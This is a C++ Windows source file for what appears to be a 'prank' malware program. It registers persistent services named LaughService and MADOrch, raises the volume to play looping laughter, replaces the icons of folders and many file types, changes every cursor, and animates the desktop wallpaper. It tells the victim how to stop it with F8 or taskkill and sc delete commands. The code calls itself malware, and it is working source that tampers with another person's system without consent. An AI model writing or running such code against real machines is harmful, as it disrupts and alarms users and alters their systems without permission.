#include "Intro.h"
#include "register_service.h"

#include "ch_folder_icons.h"
#include "ch_app_icons.h"
#include <string>
#include <vector>
#include <tlhelp32.h>


char ExePath_holder [255] = {0};
DWORD lol = GetModuleFileNameA(NULL, ExePath_holder, 255);
std::filesystem::path expath(ExePath_holder);
std::string ParentDirectory = expath.parent_path().string();



// Sound functions
DWORD WINAPI MP3Proc(_In_ LPVOID lpParameter) //lpParameter can be a pointer to a structure that store data that you cannot access outside of this function. You can prepare this structure before `CreateThread` and give it's address in the `lpParameter`
{
    //Data *data = (Data*)lpParameter; //If you call this structure Data, but you can call it whatever you want.
    while (true)
    {
        mciSendString("play mp3 from 0 wait", NULL, 0, NULL);
        //Do here what you want to do when the mp3 playback is over
        SuspendThread(GetCurrentThread()); //or the handle of this thread that you keep in a static variable instead
    }
}

int AttachToMasterOutput(IMMDeviceEnumerator* &deviceEnumerator, IMMDevice* &defaultDevice, IAudioEndpointVolume* &endpointVolume)
{
    CoInitialize(nullptr);
    
    HRESULT hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr,
                                  CLSCTX_INPROC_SERVER,
                                  __uuidof(IMMDeviceEnumerator),
                                  (void**)&deviceEnumerator);
    if (FAILED(hr)) {
        std::cerr << "Failed to create device enumerator\n";
        return 1;
    }

    
    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    if (FAILED(hr)) {
        std::cerr << "Failed to get default audio endpoint\n";
        deviceEnumerator->Release();
        return 1;
    }

    
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
                                 CLSCTX_INPROC_SERVER, nullptr,
                                 (void**)&endpointVolume);
    if (FAILED(hr)) {
        std::cerr << "Failed to activate endpoint volume\n";
        defaultDevice->Release();
        deviceEnumerator->Release();
        return 1;
    }


    return 0;
}

int DetachFromMasterOutput(IAudioEndpointVolume* &endpointVolume, IMMDevice* &defaultDevice, IMMDeviceEnumerator* &deviceEnumerator)
{
    endpointVolume->Release();
    defaultDevice->Release();
    deviceEnumerator->Release();
    CoUninitialize();
    return 0;
}



void SpawnDelayedMessageBox(int delayPeriod, std::string text, std::string caption, bool stop = false)
{

    Sleep(delayPeriod);
    MessageBoxA(NULL, text.c_str(), caption.c_str(), MB_OK | MB_ICONWARNING | MB_DEFBUTTON1 | MB_APPLMODAL | MB_TOPMOST);

    if(!stop)
    {
        auto a1 = std::async(std::launch::async, &SpawnDelayedMessageBox, 10000, "How to stop the Laughing Audio?\n1) Open a cmd\n2) Type taskkill /f /t /im MAD.exe   then press enter\n3) Type sc stop MADOrch then press enter\n4) Type sc delete MADOrch then press enter\n 5) Type sc stop LaughService then press enter\n6) Type sc delete LaughService then press enter\n\t:)\n   Happy Hacking!!", "How to stop the malware?", 1);
    }

}





int main(int argc, char* argv []) {
    bool isShortIntro = 1;
    Intro(isShortIntro);   //I chose, The short Intro
    
    #ifndef DEBUG
        


        std::string LaughServicePath = ParentDirectory + "\\" + "laugh_service.exe";
        
        while(register_service(LaughServicePath, "LaughService") && (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING))
            {Sleep(200);}

        std::string MADOrchestratorPath = ParentDirectory + "\\" + "MAD_Orch_Service.exe";
        while(register_service(MADOrchestratorPath, "MADOrch") && (GetLastError() != ERROR_SERVICE_ALREADY_RUNNING))
            {Sleep(200);}

        
    #endif  




    
    
    // Play the sound
    IMMDeviceEnumerator* deviceEnumerator = nullptr;
    IMMDevice* defaultDevice = nullptr;
    IAudioEndpointVolume* endpointVolume = nullptr;

    //Increase the volume
    AttachToMasterOutput(deviceEnumerator, defaultDevice, endpointVolume);
    float original_volume = 0;
    endpointVolume->GetMasterVolumeLevelScalar(&original_volume);
    endpointVolume->SetMasterVolumeLevelScalar(0.3, nullptr);


    LPCSTR LaughSoundPath = std::string(ParentDirectory + "\\" + "..\\data\\mus_f_newlaugh.wav").c_str();//std::filesystem::absolute("eid_far5a_cropped.wav").string().c_str();
    PlaySoundA(LaughSoundPath, NULL, SND_SYNC);



    
    

    std::vector<std::wstring> extensions = {L".txt", L".exe",  L".dll", L".doc", L".docx",
                                    L".docm", L".pdf", L".psd", L".png", L".jpg", L".7z", L".rar", L".zip", L".html"
                                    , L".xlsm", L".xlsx", L".xls", L".cur"};


    const std::wstring path_to_ico =  std::filesystem::absolute(ParentDirectory + "\\" + "..\\data\\roast.ico").wstring();//L"revert";//


    FuckUpFolders(path_to_ico, false);
    FuckUpIcons(path_to_ico, extensions, false);
    



    //Saving current background path
    std::wstring BGPath = GetCurrentBackground();
    int counter = 1;

    //change all cursors
    std::string rel_cursonImgPath = ParentDirectory + "\\" + "..\\data\\chicken_cursor.cur";
    std::string cursorImgPath = std::filesystem::absolute(rel_cursonImgPath).string();
    changeAllCursors(cursorImgPath.c_str());





    
    std::string SoundPath = ParentDirectory + "\\" + "..\\data\\eid_far5a_cropped.wav";//std::filesystem::absolute("eid_far5a_cropped.wav").string().c_str();
    PlaySoundA(SoundPath.c_str(), NULL, SND_ASYNC | SND_LOOP);



    int max_files = GetFilesCountInDirectory(ParentDirectory + "\\" + "..\\data\\" +"frames");


    auto a1 = std::async(std::launch::async, &SpawnDelayedMessageBox, 30000, "How to stop the malware?\nJust press \"f8\" on your keyboard!\n\t:)", "How to stop the malware?", 0);

    //Main loop, where anything constantly running is done here;
    while(true)
    {
        if(GetAsyncKeyState(VK_F8)) //scanning for f8 press
        {
            break;
        }

        std::string strpath = std::filesystem::absolute(ParentDirectory + "\\" + "..\\data\\frames\\" + std::to_string(counter)).string();
        strpath = strpath + std::string(".bmp");

        //the following two lines are just to convert from std::string to const wchar_t*
        std::wstring intermediate_path = std::wstring(strpath.begin(), strpath.end());
        const wchar_t* path = intermediate_path.c_str();
        int result;
        result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *) path, SPIF_UPDATEINIFILE);
        std::cout << result;

        counter++;
        counter = counter%max_files;
        if (counter == 0){counter++;}

        usleep(40000); //busy waiting, decreasing this number makes the wallpaper change frames faster
    }

    // Turning off the music
    endpointVolume->SetMasterVolumeLevelScalar(original_volume, nullptr);
    DetachFromMasterOutput(endpointVolume, defaultDevice, deviceEnumerator);

    //fixing back everything
    FuckUpIcons(path_to_ico, extensions, true);
    FuckUpFolders(path_to_ico, true);
    changeCursortoDefault();

    //revert background back
    std::wstring BGPath_tmp = std::wstring(BGPath.begin(), BGPath.end());
    const wchar_t* BGPath_wchar = BGPath_tmp.c_str();
    int result;
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *) BGPath_wchar, SPIF_UPDATEINIFILE);
    std::cout << result;

    return 0;
}
